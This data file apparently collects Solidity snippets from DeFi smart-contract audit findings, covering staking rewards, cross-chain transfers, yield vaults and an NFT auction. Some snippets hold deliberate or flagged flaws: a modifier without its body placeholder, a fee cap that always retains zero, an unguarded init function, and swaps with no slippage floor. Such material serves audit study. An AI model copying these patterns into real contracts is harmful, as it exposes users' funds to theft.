"```\nfunction setRewardRate(uint256 rewardRate)\n    public\n    virtual\n    override\n    returns (bool success)\n{\n    require(rewardRate <= _valueDivisor.mul(100), ""ST17"");\n    require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), ""ST2"");\n    _rewardRate.push(rewardRate);\n    _lastMovingRewardTimestamp.push(block.timestamp);\n    emit SetRewardRate(rewardRate);\n\n    return true;\n}\n```"
"```\nfunction calculateRewards(address to)\n    public\n    virtual\n    override\n    whenNotPaused\n    returns (bool success)\n{\n    require(to == _msgSender(), ""ST5"");\n    uint256 reward = _calculateRewards(to);\n    emit TriggeredCalculateRewards(to, reward, block.timestamp);\n    return true;\n}\n```"
"```\nfunction initialize(address pauserAddress) public virtual initializer {\n    _ERC20_init(""pSTAKE Token"", ""PSTAKE"");\n    _AccessControl_init();\n    _Pausable_init();\n    _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\n    _setupRole(PAUSER_ROLE, pauserAddress);\n    _setupDecimals(18);\n    _mint(_msgSender(), 5000000000000000000000000);\n}\n```"
"```\nfunction setUTokensContract(address uAddress) public virtual override {\n    require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), ""LP9"");\n    _uTokens = IUTokens(uAddress);\n    emit SetUTokensContract(uAddress);\n}\n\nfunction setSTokensContract(address sAddress) public virtual override {\n    require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), ""LP10"");\n    _sTokens = ISTokens(sAddress);\n    emit SetSTokensContract(sAddress);\n}\n\nfunction setPSTAKEContract(address pstakeAddress) public virtual override {\n    require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), ""LP11"");\n    _pstakeTokens = IPSTAKE(pstakeAddress);\n    emit SetPSTAKEContract(pstakeAddress);\n}\n```\n```\n/**\n * @dev Set 'unstake props', called from admin\n * @param unstakingLockTime: varies from 21 hours to 21 days\n *\n * Emits a {SetUnstakeProps} event with 'fee' set to the stake and unstake.\n */\nfunction setUnstakingLockTime(uint256 unstakingLockTime)\n    public\n    virtual\n    returns (bool success)\n{\n    require(hasRole(DEFAULT_ADMIN_ROLE, _msgSender()), ""LQ3"");\n    _unstakingLockTime = unstakingLockTime;\n    emit SetUnstakingLockTime(unstakingLockTime);\n    return true;\n}\n```"
"```\nrequire(relayerFee <= txData.amount, ""#F:023"")\n```"
"```\n/**\n * @notice This is used by any router to decrease their available\n * liquidity for a given asset.\n * @param shares The amount of liquidity to remove for the router in shares\n * @param assetId The address (or `address(0)` if native asset) of the\n * asset you're removing liquidity for\n * @param recipient The address that will receive the liquidity being removed\n */\nfunction removeLiquidity(\n    uint256 shares,\n    address assetId,\n    address payable recipient\n) external override {\n    // Sanity check: recipient is sensible\n    require(recipient!= address(0), ""#RL:007"");\n\n    // Sanity check: nonzero shares\n    require(shares > 0, ""#RL:035"");\n\n    // Get stored router shares\n    uint256 routerShares = issuedShares[msg.sender][assetId];\n\n    // Get stored outstanding shares\n    uint256 outstanding = outstandingShares[assetId];\n\n    // Sanity check: owns enough shares\n    require(routerShares >= shares, ""#RL:018"");\n\n    // Convert shares to amount\n    uint256 amount = getAmountFromIssuedShares(\n        shares,\n        outstanding,\n        Asset.getOwnBalance(assetId)\n    );\n\n    // Update router issued shares\n    // NOTE: unchecked due to require above\n    unchecked {\n        issuedShares[msg.sender][assetId] = routerShares - shares;\n    }\n\n    // Update the total shares for asset\n    outstandingShares[assetId] = outstanding - shares;\n\n    // Transfer from contract to specified recipient\n    Asset.transferAsset(assetId, recipient, amount);\n\n    // Emit event\n    emit LiquidityRemoved(\n        msg.sender,\n        assetId,\n        shares,\n        amount,\n        recipient\n    );\n}\n```"
"```\nrequire(msg.sender == txData.user || recoverSignature(txData.transactionId, relayerFee, ""cancel"", signature) == txData.user, ""#C:022"");\n\nAsset.transferAsset(txData.sendingAssetId, payable(msg.sender), relayerFee);\n\nuint256 toRefund;\nunchecked {\n  toRefund = amount - relayerFee;\n}\n\nif (toRefund > 0) {\n  Asset.transferAsset(txData.sendingAssetId, payable(txData.sendingChainFallback), toRefund);\n}\n\n} else {\n  // Receiver side, router liquidity is returned\n  if (txData.expiry >= block.timestamp) {\n    // Timeout has not expired and tx may only be cancelled by user\n    require(msg.sender == txData.user || recoverSignature(txData.transactionId, relayerFee, ""cancel"", signature) == txData.user, ""#C:022"");\n```"
"```\n/**\n * Transfers ownership of the contract to a new account (`newOwner`).\n * Can only be called by the current owner.\n */\nfunction acceptProposedOwner() public virtual onlyOwner {\n    require((block.timestamp - _proposedTimestamp) > _delay, ""#APO:030"");\n    _setOwner(_proposed);\n}\n```\n```\nfunction renounced() public view override returns (bool) {\n    return owner() == address(0);\n}\n```\n```\nmodifier onlyOwner() {\n    require(owner() == msg.sender, ""#OO:029"");\n    _;\n}\n```"
"```\nbool isNative = LibAsset.isNativeAsset(assetId);\nif (!isNative) {\n    LibAsset.increaseERC20Allowance(assetId, callTo, amount);\n}\n\nif (Address.isContract(callTo)) {\n    bool success;\n    bytes memory returnData;\n    (success, returnData) = callTo.call{value: isNative? amount : 0}(callData);\n}\n\nif (!success) {\n    LibAsset.transferAsset(assetId, fallbackAddress, amount);\n    if (!isNative) {\n        LibAsset.decreaseERC20Allowance(assetId, callTo, amount);\n    }\n}\n```"
"```\nrequire(\n    invariantData.callTo == address(0) || Address.isContract(invariantData.callTo),\n    ""#P:031""\n)\n```\n(bool success, bytes memory returnData) = callTo.call{value: isEther? amount : 0}(callData);\n\nif (!success) {\n    Asset.transferAsset(assetId, fallbackAddress, amount);\n    if (!isEther) {\n        Asset.decreaseERC20Allowance(assetId, callTo, amount);\n    }\n}\n```"
"```\nfunction recoverSignature(\n  bytes32 transactionId,\n  uint256 relayerFee,\n  string memory functionIdentifier,\n  bytes calldata signature\n) internal pure returns (address) {\n  SignedData memory payload = SignedData({\n    transactionId: transactionId,\n    relayerFee: relayerFee,\n    functionIdentifier: functionIdentifier\n  });\n\n  return ECDSA.recover(ECDSA.toEthSignedMessageHash(keccak256(abi.encode(payload))), signature);\n}\n```"
"```\n/**\n * @dev The chain id of the contract, is passed in to avoid any evm issues\n */\nuint256 public immutable chainId;\n```\n```\nconstructor(uint256 _chainId) {\n    chainId = _chainId;\n    interpreter = new FulfillInterpreter(address(this));\n}\n```"
```\nuint128 virtualAmountDelta = uint128((amount * poolDeposit.multiplier) / SCALE_FACTOR);\n\npoolDeposit.amount -= amount;\nuser.rewardDebt = user.rewardDebt - toSigned128(user.virtualAmount * pool.accTribePerShare) / toSigned128(ACC_TRIBE_PRECISION);\nuser.virtualAmount -= virtualAmountDelta;\npool.virtualTotalSupply -= virtualAmountDelta;\n```
"```\nfunction governorAddPoolMultiplier(\n    uint256 _pid,\n    uint64 lockLength,\n    uint64 newRewardsMultiplier\n) external onlyGovernor {\n    PoolInfo storage pool = poolInfo[_pid];\n    uint256 currentMultiplier = rewardMultipliers[_pid][lockLength];\n\n    if (newRewardsMultiplier < currentMultiplier) {\n        pool.unlocked = true;\n    }\n\n    rewardMultipliers[_pid][lockLength] = newRewardsMultiplier;\n\n    emit LogPoolMultiplier(_pid, lockLength, newRewardsMultiplier);\n}\n```"
```\nuser.rewardDebt = int128(\n    user.virtualAmount * pool.accTribePerShare\n) / toSigned128(ACC_TRIBE_PRECISION)\n```\n```\npool.accTribePerShare = uint128(\n    pool.accTribePerShare + (\n        (tribeReward * ACC_TRIBE_PRECISION) / virtualSupply\n    )\n)\n```\nuserPoolData.rewardDebt += int128(\n    virtualAmountDelta * pool.accTribePerShare\n) / toSigned128(ACC_TRIBE_PRECISION);\n```
"```\nfunction set(\n    uint256 _pid,\n    uint128 _allocPoint,\n    IRewarder _rewarder,\n    bool overwrite\n) public onlyGovernor {\n    totalAllocPoint = (totalAllocPoint - poolInfo[_pid].allocPoint) + _allocPoint;\n    poolInfo[_pid].allocPoint = _allocPoint.toUint64();\n\n    if (overwrite) {\n        rewarder[_pid] = _rewarder;\n    }\n\n    emit LogSetPool(\n        _pid,\n        _allocPoint,\n        overwrite? _rewarder : rewarder[_pid],\n        overwrite\n    );\n}\n```"
```\nif (virtualSupply > 0) {\n    uint256 blocks = block.number - pool.lastRewardBlock;\n    uint256 tribeReward = (blocks * tribePerBlock() * pool.allocPoint) / totalAllocPoint;\n    pool.accTribePerShare = uint128(pool.accTribePerShare + ((tribeReward * ACC_TRIBE_PRECISION) / virtualSupply));\n}\n```\n```\nfunction updateBlockReward(uint256 newBlockReward) external onlyGovernor {\n    tribalChiefTribePerBlock = newBlockReward;\n    emit NewTribePerBlock(newBlockReward);\n}\n```
```\nfunction resetRewards(uint256 _pid) public onlyGuardianOrGovernor {\n    totalAllocPoint = (totalAllocPoint - poolInfo[_pid].allocPoint);\n    poolInfo[_pid].allocPoint = 0;\n\n    poolInfo[_pid].unlocked = true;\n\n    rewarder[_pid] = IRewarder(address(0));\n}\n```
"```\nfunction governorAddPoolMultiplier(\n    uint256 _pid,\n    uint64 lockLength,\n    uint64 newRewardsMultiplier\n) external onlyGovernor {\n    PoolInfo storage pool = poolInfo[_pid];\n    uint256 currentMultiplier = rewardMultipliers[_pid][lockLength];\n\n    if (newRewardsMultiplier < currentMultiplier) {\n        pool.unlocked = true;\n    }\n\n    rewardMultipliers[_pid][lockLength] = newRewardsMultiplier;\n\n    emit LogPoolMultiplier(_pid, lockLength, newRewardsMultiplier);\n}\n```"
"```\nfunction set(\n    uint256 _pid,\n    uint128 _allocPoint,\n    IRewarder _rewarder,\n    bool overwrite\n) public onlyGovernor {\n    totalAllocPoint = (totalAllocPoint - poolInfo[_pid].allocPoint) + _allocPoint;\n    poolInfo[_pid].allocPoint = _allocPoint.toUint64();\n\n    if (overwrite) {\n        rewarder[_pid] = _rewarder;\n    }\n\n    emit LogSetPool(\n        _pid,\n        _allocPoint,\n        overwrite? _rewarder : rewarder[_pid],\n        overwrite\n    );\n}\n```"
"```\nfunction _deposit(uint256 _amount, address _tranche) internal returns (uint256 _minted) {\n    _guarded(_amount);\n    _updateCallerBlock();\n    _checkDefault();\n    _updateAccounting();\n    _minted = _mintShares(_amount, msg.sender, _tranche);\n    IERC20Detailed(token).safeTransferFrom(msg.sender, address(this), _amount);\n}\n```"
```\nif (BBTotSupply == 0):\n    AAGain = gain\nelse if (AATotSupply == 0):\n    BBGain = gain\nelse:\n    AAGain = gain * trancheAPRSplitRatio / FULL_ALLOC\n    BBGain = gain - AAGain\n```\n```\nif (_tranche == AATranche):\n    trancheNAV = lastNAVAA + (gain * _trancheAPRSplitRatio / FULL_ALLOC)\nelse:\n    trancheNAV = lastNAVBB + (gain * (FULL_ALLOC - _trancheAPRSplitRatio) / FULL_ALLOC)\n```
"```\nfunction harvest(\n    bool _skipRedeem,\n    bool _skipIncentivesUpdate,\n    bool[] calldata _skipReward,\n    uint256[] calldata _minAmount\n) external {\n    require(msg.sender == rebalancer || msg.sender == owner(), ""IDLE:!AUTH"");\n}\n```\n```\nIERC20Detailed(rewardToken).safeIncreaseAllowance(address(_uniRouter), _currentBalance);\n\n_uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    _currentBalance,\n    _minAmount[i],\n    _path,\n    address(this),\n    block.timestamp + 1\n)"
```\ntoken = _guardedToken\nstrategy = _strategy\nstrategyToken = IIdleCDOStrategy(_strategy).strategyToken()\nrebalancer = _rebalancer\n```\n```\nguardian = _owner;\n```\naddress _currAAStaking = AAStaking;\naddress _currBBStaking = BBStaking;\n```\n```\nidleCDO = _idleCDO;\ntranche = _trancheToken;\nrewards = _rewards;\ngovernanceRecoveryFund = _governanceRecoveryFund;\n```
"```\nuint256 constant MAXIMUM_DEPOSIT_FEE = 5e16; // 5%\nuint256 constant DEFAULT_DEPOSIT_FEE = 0e16; // 0%\n\nuint256 constant MAXIMUM_PERFORMANCE_FEE = 50e16; // 50%\nuint256 constant DEFAULT_PERFORMANCE_FEE = 10e16; // 10%\n```\n```\nfunction gulp(uint256 _minRewardAmount) external onlyEOAorWhitelist nonReentrant {\n    uint256 _pendingReward = _getPendingReward();\n    if (_pendingReward > 0) {\n        _withdraw(0);\n    }\n\n    uint256 _totalReward = Transfers._getBalance(rewardToken);\n    uint256 _feeReward = _totalReward.mul(performanceFee) / 1e18;\n    Transfers._pushFunds(rewardToken, collector, _feeReward);\n\n    if (rewardToken!= routingToken) {\n        require(exchange!= address(0), ""exchange not set"");\n        uint256 _totalReward = Transfers._getBalance(rewardToken);\n        Transfers._approveFunds(rewardToken, exchange, _totalReward);\n        IExchange(exchange).convertFundsFromInput(rewardToken, routingToken, _totalReward, 1);\n    }\n\n    if (routingToken!= reserveToken) {\n        require(exchange!= address(0), ""exchange not set"");\n        uint256 _totalRouting = Transfers._getBalance(routingToken);\n        Transfers._approveFunds(routingToken, exchange, _totalRouting);\n        IExchange(exchange).joinPoolFromInput(reserveToken, routingToken, _totalRouting, 1);\n    }\n\n    uint256 _totalBalance = Transfers._getBalance(reserveToken);\n    require(_totalBalance >= _minRewardAmount, ""high slippage"");\n    _deposit(_totalBalance);\n}\n```"
"```\nfunction withdraw(uint256 _shares, uint256 _minAmount) external onlyEOAorWhitelist nonReentrant {\n    address _from = msg.sender;\n    (uint256 _amount, uint256 _withdrawalAmount, uint256 _netAmount) = _calcAmountFromShares(_shares);\n    require(_netAmount >= _minAmount, ""high slippage"");\n    _burn(_from, _shares);\n    _withdraw(_amount);\n    Transfers._pushFunds(reserveToken, _from, _withdrawalAmount);\n}\n```"
"```\nfunction gulp(uint256 _minRewardAmount) external onlyEOAorWhitelist nonReentrant {\n    uint256 _pendingReward = _getPendingReward();\n    if (_pendingReward > 0) {\n        _withdraw(0);\n    }\n    uint256 __totalReward = Transfers._getBalance(rewardToken);\n    (uint256 _feeReward, uint256 _retainedReward) = _capFeeAmount(__totalReward.mul(performanceFee) / 1e18);\n    Transfers._pushFunds(rewardToken, buyback, _feeReward);\n\n    if (rewardToken!= routingToken) {\n        require(exchange!= address(0), ""exchange not set"");\n        uint256 _totalReward = Transfers._getBalance(rewardToken);\n        _totalReward = _capTransferAmount(rewardToken, _totalReward, _retainedReward);\n        Transfers._approveFunds(rewardToken, exchange, _totalReward);\n        IExchange(exchange).convertFundsFromInput(rewardToken, routingToken, _totalReward, 1);\n    }\n\n    if (routingToken!= reserveToken) {\n        require(exchange!= address(0), ""exchange not set"");\n        uint256 _totalRouting = Transfers._getBalance(routingToken);\n        _totalRouting = _capTransferAmount(routingToken, _totalRouting, _retainedReward);\n        Transfers._approveFunds(routingToken, exchange, _totalRouting);\n        IExchange(exchange).joinPoolFromInput(reserveToken, routingToken, _totalRouting, 1);\n    }\n\n    uint256 _totalBalance = Transfers._getBalance(reserveToken);\n    _totalBalance = _capTransferAmount(reserveToken, _totalBalance, _retainedReward);\n    require(_totalBalance >= _minRewardAmount, ""high slippage"");\n    _deposit(_totalBalance);\n}\n```\n```\n(uint256 _feeReward, uint256 _retainedReward) = _capFeeAmount(_totalReward.mul(performanceFee) / 1e18);\n```"
"```\nfunction _capFeeAmount(uint256 _amount) internal view returns (uint256 _capped, uint256 _retained) {\n    _retained = 0;\n    uint256 _limit = _calcMaxRewardTransferAmount();\n    if (_amount > _limit) {\n        _amount = _limit;\n        _retained = _amount.sub(_limit);\n    }\n    return (_amount, _retained);\n}"
```\nuint256 _amount1 = _balance.mul(DEFAULT_REWARD_BUYBACK1_SHARE) / 1e18;\nuint256 _amount2 = _balance.mul(DEFAULT_REWARD_BUYBACK2_SHARE) / 1e18;\n```\n```\nuint256 _amount1 = _balance.mul(DEFAULT_REWARD_BUYBACK1_SHARE) / 1e18;\nuint256 _amount2 = _balance.mul(DEFAULT_REWARD_BUYBACK2_SHARE) / 1e18;\n```
"```\nfunction convertFundsFromInput(\n    address _from,\n    address _to,\n    uint256 _inputAmount,\n    uint256 _minOutputAmount\n) external override returns (uint256 _outputAmount) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_from, _sender, _inputAmount);\n    _inputAmount = Math._min(_inputAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    _outputAmount = UniswapV2ExchangeAbstraction._convertFundsFromInput(\n        router,\n        _from,\n        _to,\n        _inputAmount,\n        _minOutputAmount\n    );\n    _outputAmount = Math._min(_outputAmount, Transfers._getBalance(_to)); // deals with potential transfer tax\n    Transfers._pushFunds(_to, _sender, _outputAmount);\n    return _outputAmount;\n}\n```\n```\nfunction joinPoolFromInput(\n    address _pool,\n    address _token,\n    uint256 _inputAmount,\n    uint256 _minOutputShares\n) external override returns (uint256 _outputShares) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_token, _sender, _inputAmount);\n    _inputAmount = Math._min(_inputAmount, Transfers._getBalance(_token)); // deals with potential transfer tax\n    _outputShares = UniswapV2LiquidityPoolAbstraction._joinPoolFromInput(\n        router,\n        _pool,\n        _token,\n        _inputAmount,\n        _minOutputShares\n    );\n    _outputShares = Math._min(_outputShares, Transfers._getBalance(_pool)); // deals with potential transfer tax\n    Transfers._pushFunds(_pool, _sender, _outputShares);\n    return _outputShares;\n}\n```\n```\nfunction convertFundsFromOutput(\n    address _from,\n    address _to,\n    uint256 _outputAmount,\n    uint256 _maxInputAmount\n) external override returns (uint256 _inputAmount) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_from, _sender, _maxInputAmount);\n    _maxInputAmount = Math._min(_maxInputAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    _inputAmount = UniswapV2ExchangeAbstraction._convertFundsFromOutput(\n        router,\n        _from,\n        _to,\n        _outputAmount,\n        _maxInputAmount\n    );\n    uint256 _refundAmount = _maxInputAmount - _inputAmount;\n    _refundAmount = Math._min(_refundAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    Transfers._pushFunds(_from, _sender, _refundAmount);\n    _outputAmount = Math._min(_outputAmount, Transfers._getBalance(_to)); // deals with potential transfer tax\n    Transfers._pushFunds(_to, _sender, _outputAmount);\n    return _inputAmount;\n}\n```\n```\nfunction recoverLostFunds(address _token) external onlyOwner {\n    uint256 _balance = Transfers._getBalance(_token);\n    Transfers._pushFunds(_token, treasury, _balance);\n}\n```"
"```\nfunction convertFundsFromInput(\n    address _from,\n    address _to,\n    uint256 _inputAmount,\n    uint256 _minOutputAmount\n) external override returns (uint256 _outputAmount) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_from, _sender, _inputAmount);\n    _inputAmount = Math._min(_inputAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    _outputAmount = UniswapV2ExchangeAbstraction._convertFundsFromInput(\n        router,\n        _from,\n        _to,\n        _inputAmount,\n        _minOutputAmount\n    );\n    _outputAmount = Math._min(_outputAmount, Transfers._getBalance(_to)); // deals with potential transfer tax\n    Transfers._pushFunds(_to, _sender, _outputAmount);\n    return _outputAmount;\n}\n```\n```\nfunction joinPoolFromInput(\n    address _pool,\n    address _token,\n    uint256 _inputAmount,\n    uint256 _minOutputShares\n) external override returns (uint256 _outputShares) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_token, _sender, _inputAmount);\n    _inputAmount = Math._min(_inputAmount, Transfers._getBalance(_token)); // deals with potential transfer tax\n    _outputShares = UniswapV2LiquidityPoolAbstraction._joinPoolFromInput(\n        router,\n        _pool,\n        _token,\n        _inputAmount,\n        _minOutputShares\n    );\n    _outputShares = Math._min(_outputShares, Transfers._getBalance(_pool)); // deals with potential transfer tax\n    Transfers._pushFunds(_pool, _sender, _outputShares);\n    return _outputShares;\n}\n```\n```\nfunction convertFundsFromOutput(\n    address _from,\n    address _to,\n    uint256 _outputAmount,\n    uint256 _maxInputAmount\n) external override returns (uint256 _inputAmount) {\n    address _sender = msg.sender;\n    Transfers._pullFunds(_from, _sender, _maxInputAmount);\n    _maxInputAmount = Math._min(_maxInputAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    _inputAmount = UniswapV2ExchangeAbstraction._convertFundsFromOutput(\n        router,\n        _from,\n        _to,\n        _outputAmount,\n        _maxInputAmount\n    );\n    uint256 _refundAmount = _maxInputAmount - _inputAmount;\n    _refundAmount = Math._min(_refundAmount, Transfers._getBalance(_from)); // deals with potential transfer tax\n    Transfers._pushFunds(_from, _sender, _refundAmount);\n    _outputAmount = Math._min(_outputAmount, Transfers._getBalance(_to)); // deals with potential transfer tax\n    Transfers._pushFunds(_to, _sender, _outputAmount);\n    return _inputAmount;\n}\n```\n```\nfunction recoverLostFunds(address _token) external onlyOwner {\n    uint256 _balance = Transfers._getBalance(_token);\n    Transfers._pushFunds(_token, treasury, _balance);\n}\n```"
"```\nfunction supplyTokenTo(uint256 _amount, address to) override external {\n    uint256 shares = _tokenToShares(_amount);\n\n    _mint(to, shares);\n\n    // we have to deposit after calculating shares to mint\n    token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    _depositInVault();\n\n    emit SuppliedTokenTo(msg.sender, shares, _amount, to);\n}\n```"
"```\nreturn v.deposit()\n```\n```\nfunction supplyTokenTo(uint256 _amount, address to) override external {\n    uint256 shares = _tokenToShares(_amount);\n\n    _mint(to, shares);\n\n    // we have to deposit after calculating shares to mint\n    token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    _depositInVault();\n\n    emit SuppliedTokenTo(msg.sender, shares, _amount, to);\n}\n```"
"```\nfunction redeemToken(uint256 amount) public override returns (uint256) {\n    ISushiBar bar = ISushiBar(sushiBar);\n    ISushi sushi = ISushi(sushiAddr);\n\n    uint256 totalShares = bar.totalSupply();\n    uint256 barSushiBalance = sushi.balanceOf(address(bar));\n    uint256 requiredShares = amount.mul(totalShares).div(barSushiBalance);\n\n    uint256 barBeforeBalance = bar.balanceOf(address(this));\n    uint256 sushiBeforeBalance = sushi.balanceOf(address(this));\n\n    bar.leave(requiredShares);\n\n    uint256 barAfterBalance = bar.balanceOf(address(this));\n    uint256 sushiAfterBalance = sushi.balanceOf(address(this));\n\n    uint256 barBalanceDiff = barBeforeBalance.sub(barAfterBalance);\n    uint256 sushiBalanceDiff = sushiAfterBalance.sub(sushiBeforeBalance);\n\n    balances[msg.sender] = balances[msg.sender].sub(barBalanceDiff);\n    sushi.transfer(msg.sender, sushiBalanceDiff);\n    return sushiBalanceDiff;\n}\n```"
```\nfunction balanceOfToken(address addr) public override returns (uint256) {\n    if (balances[addr] == 0) return 0;\n    ISushiBar bar = ISushiBar(sushiBar);\n\n    uint256 shares = bar.balanceOf(address(this));\n    uint256 totalShares = bar.totalSupply();\n\n    uint256 sushiBalance = shares.mul(ISushi(sushiAddr).balanceOf(address(sushiBar))).div(totalShares);\n    uint256 sourceShares = bar.balanceOf(address(this));\n\n    return balances[addr].mul(sushiBalance).div(sourceShares);\n}\n```
"```\nif (token.allowance(address(this), address(v)) < token.balanceOf(address(this))) {\n    token.safeApprove(address(v), 0);\n    token.safeApprove(address(v), type(uint256).max);\n}\n```"
"```\ncontract SushiYieldSource is IYieldSource {\n    using SafeMath for uint256;\n\n    address public sushiBar;\n    address public sushiAddr;\n    mapping(address => uint256) public balances;\n\n    constructor(address _sushiBar, address _sushiAddr) public {\n        sushiBar = _sushiBar;\n        sushiAddr = _sushiAddr;\n    }\n```"
```\nuint256 barBeforeBalance = bar.balanceOf(address(this));\nuint256 sushiBeforeBalance = sushi.balanceOf(address(this));\n\nbar.leave(requiredShares);\n\nuint256 barAfterBalance = bar.balanceOf(address(this));\nuint256 sushiAfterBalance = sushi.balanceOf(address(this));\n\nuint256 barBalanceDiff = barBeforeBalance.sub(barAfterBalance);\nuint256 sushiBalanceDiff = sushiAfterBalance.sub(sushiBeforeBalance);\n\nbalances[msg.sender] = balances[msg.sender].sub(barBalanceDiff);\n```
"```\ninterface ISushiBar {\n    function enter(uint256 _amount) external;\n\n    function leave(uint256 _share) external;\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}"
"```\n/**\n * @dev Harvest additional yield from the investment.\n * Only governance or strategist can call this function.\n */\nfunction harvest(address[] calldata _tokens, uint256[] calldata _cumulativeAmounts, uint256 _index, uint256 _cycle,\n```\n```\nIBadgerTree(BADGER_TREE).claim(\n    _tokens,\n    _cumulativeAmounts,\n    _index,\n    _cycle,\n    _merkleProof,\n    _amountsToClaim\n)\n```\nuint256 _badger = IERC20Upgradeable(BADGER).balanceOf(address(this));\nif (_badger > 0) {\n    IERC20Upgradeable(BADGER).safeApprove(SUSHISWAP, 0);\n    IERC20Upgradeable(BADGER).safeApprove(SUSHISWAP, _badger);\n\n    address[] memory _path = new address[](2);\n    _path[0] = BADGER;\n    _path[1] = WBTC;\n\n    IUniswapRouter(SUSHISWAP).swapExactTokensForTokens(_badger, uint256(0), _path, address(this), block.timestamp.add(1800));\n}\n```\n```\n/**\n * @dev Deprecated. This function has issues similar to the ones found in\n * IERC20-approve, and its usage is discouraged.\n*/\n```\n/**\n * @dev Deprecated. This function has issues similar to the ones found in\n * IERC20-approve, and its usage is discouraged.\n*/\n```\nIUniswapRouter(SUSHISWAP).swapExactTokensForTokens(\n    _badger,\n    uint256(0),\n    _path,\n    address(this),\n    block.timestamp.add(1800)\n)"
"```\nmodifier onlyGovernance() {\n    _checkGovernance();\n}\n```\n```\nfunction _checkGovernance() internal view {\n    require(msg.sender == governance, ""not governance"");\n}\n```\n```\nfunction _checkStrategist() internal view {\n    require(msg.sender == governance || strategists[msg.sender], ""not strategist"");\n}\n\nmodifier onlyStrategist {\n    _checkStrategist();\n    _\n}\n```\n```\nfunction _checkGovernance() internal view {\n    require(msg.sender == governance, ""not governance"");\n}\n\nmodifier onlyGovernance() {\n    _checkGovernance();\n    _;\n}\n```\n```\nfunction _checkGovernance() internal view {\n    require(msg.sender == IGaugeController(controller).governance(), ""not governance"");\n}\n\nmodifier onlyGovernance() {\n    _checkGovernance();\n    _;\n}\n```"
"```\nfunction zDeposit(address to) external payable onlyZauction {\n    ethbalance[to] = SafeMath.add(ethbalance[to], msg.value);\n    emit zDeposited(to, msg.value);\n}\n\nfunction zWithdraw(address from, uint256 amount) external onlyZauction {\n    ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n    emit zWithdrew(from, amount);\n}\n```"
"```\nfunction SetZauction(address zauctionaddress) external onlyAdmin {\n    zauction = zauctionaddress;\n    emit ZauctionSet(zauctionaddress);\n}\n\nfunction SetAdmin(address newadmin) external onlyAdmin {\n    admin = newadmin;\n    emit AdminSet(msg.sender, newadmin);\n}\n```"
"```\nfunction acceptBid(\n    bytes memory signature,\n    uint256 rand,\n    address bidder,\n    uint256 bid,\n    address nftAddress,\n    uint256 tokenid\n) external {\n    address recoveredBidder = recover(\n        toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftAddress, tokenid))),\n        signature\n    );\n    require(bidder == recoveredBidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftContract = IERC721(nftAddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftContract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftAddress, tokenid);\n}\n```\n```\nfunction fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n    approvedBids[hashOfSig] = false;\n    emit DomainBidFulfilled(\n        metadata,\n        name,\n        recoveredBidder,\n        id,\n        parentId\n    );\n}\n```"
```\nfunction init(address accountantAddress) external {\n    require(!initialized);\n    initialized = true;\n    accountant = zAuctionAccountant(accountantAddress);\n}\n```
```\nfunction SetZauction(address zauctionAddress) external onlyAdmin {\n    zauction = zauctionAddress;\n    emit ZauctionSet(zauctionAddress);\n}\n```
"```\nfunction fulfillDomainBid(\n  uint256 parentId,\n  uint256 bidAmount,\n  uint256 royaltyAmount,\n  string memory bidIPFSHash,\n  string memory name,\n  string memory metadata,\n  bytes memory signature,\n  bool lockOnCreation,\n  address recipient\n) external {\n    bytes32 recoveredBidHash = createBid(parentId, bidAmount, bidIPFSHash, name);\n    address recoveredBidder = recover(recoveredBidHash, signature);\n    require(recipient == recoveredBidder, ""ZNS: bid info doesn't match/exist"");\n    bytes32 hashOfSig = keccak256(abi.encode(signature));\n    require(approvedBids[hashOfSig] == true, ""ZNS: has been fulfilled"");\n    infinity.safeTransferFrom(recoveredBidder, controller, bidAmount);\n    uint256 id = registrar.registerDomain(parentId, name, controller, recoveredBidder);\n    registrar.setDomainMetadataUri(id, metadata);\n    registrar.setDomainRoyaltyAmount(id, royaltyAmount);\n    registrar.transferFrom(controller, recoveredBidder, id);\n    if (lockOnCreation) {\n        registrar.lockDomainMetadataForOwner(id);\n    }\n    approvedBids[hashOfSig] = false;\n    emit DomainBidFulfilled(\n        metadata,\n        name,\n        recoveredBidder,\n        id,\n        parentId\n    );\n}\n```\n```\nfunction acceptBid(\n    bytes memory signature,\n    uint256 rand,\n    address bidder,\n    uint256 bid,\n    address nftAddress,\n    uint256 